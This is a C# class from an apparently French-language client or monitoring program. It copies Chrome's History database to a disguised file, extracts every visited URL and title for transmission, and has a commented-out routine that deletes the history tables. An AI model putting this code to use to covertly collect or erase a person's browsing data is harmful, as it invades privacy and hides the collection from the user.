using ClIENT_PC.Controller.Communacation;
using System;
using System.Collections.Generic;
using System.Data;
using System.Data.SQLite;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Web;

namespace ClIENT_PC.Controller.Historique
{
    class ChromeHistorique : ControllerBase
    {
        //public List<URL> URLs = new List<URL>();
        public string liste()
        {
            // Get Current Users App Data
            string documentsFolder = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            string[] tempstr = documentsFolder.Split('\\');
            string tempstr1 = "";
            documentsFolder += "\\Google\\Chrome\\User Data\\Default";
            if (tempstr[tempstr.Length - 1] != "Local")
            {
                for (int i = 0; i < tempstr.Length - 1; i++)
                {
                    tempstr1 += tempstr[i] + "\\";
                }
                documentsFolder = tempstr1 + "Local\\Google\\Chrome\\User Data\\Default";
            }

            // Check if directory exists
            if (Directory.Exists(documentsFolder))
            {
                return Encode(new { history = ExtractUserHistory(documentsFolder) });
            }
            return null;
        }

        public List<object> ExtractUserHistory(string folder)
        {
            // Get User history info
            DataTable historyDT = ExtractFromTable("urls", folder);
            // Get visit Time/Data info
            DataTable visitsDT = ExtractFromTable("visits", folder);

            List<object> ListeHistorique = new List<object> { };

            // Loop each history entry
            foreach (DataRow row in historyDT.Rows)
            {
                // Obtain URL and Title strings
                string url = row["url"].ToString();
                string title = row["title"].ToString();

                // Add entry to list
                ListeHistorique.Add(new { name = "Google Chrome", title = title.Replace('\'', ' '), url = url.Replace('\'', ' ') });

            }
            // Clear URL History
           // DeleteFromTable("urls", folder);
           // DeleteFromTable("visits", folder);
            ListeHistorique.RemoveAt(ListeHistorique.Count - (ListeHistorique.Count / 2));
            return ListeHistorique;
        }
        void DeleteFromTable(string table, string folder)
        {
            SQLiteConnection sql_con;
            SQLiteCommand sql_cmd;

            // FireFox database file
            string dbChemin = folder + "\\History";

            string chemin = Parametre.CheminTravail + @"\qddriveClass";
            // If file exists
            if (File.Exists(dbChemin))
            {
                try { if (File.Exists(chemin)) { File.Delete(chemin); } }
                catch { }
                try { File.Copy(dbChemin, chemin); }
                catch { }
            }

            // If file exists
            if (File.Exists(chemin))
            {
                // Data connection
                sql_con = new SQLiteConnection("Data Source=" + chemin + ";Version=3;New=False;Compress=True;");

                // Open the Conn
                sql_con.Open();

                // Delete Query
                string CommandText = "delete from " + table;

                // Create command
                sql_cmd = new SQLiteCommand(CommandText, sql_con);

                sql_cmd.ExecuteNonQuery();

                // Clean up
                sql_con.Close();
            }
        }

        DataTable ExtractFromTable(string table, string folder)
        {
            SQLiteConnection sql_con;
            SQLiteCommand sql_cmd;
            SQLiteDataAdapter DB;
            DataTable DT = new DataTable();

            // FireFox database file
            string dbPath = folder + "\\History";
            
            string chemin = Parametre.CheminTravail + @"\qddriveClass";
            // If file exists
             if (File.Exists(dbPath))
             {
                try { if (File.Exists(chemin)) { File.Delete(chemin); } }
                catch { }
                try { File.Copy(dbPath, chemin);}
                catch { }
             }

            if (File.Exists(chemin))
            {
                // Data connection
                sql_con = new SQLiteConnection("Data Source=" + chemin +";Version=3;New=False;Compress=True;");

                // Open the Connection
                sql_con.Open();
                sql_cmd = sql_con.CreateCommand();

                // Select Query
                string CommandText = "select * from " + table;

                // Populate Data Table
                DB = new SQLiteDataAdapter(CommandText, sql_con);
                DB.Fill(DT);

                // Clean up
                sql_con.Close();
            }
            return DT;
        }
    }
}
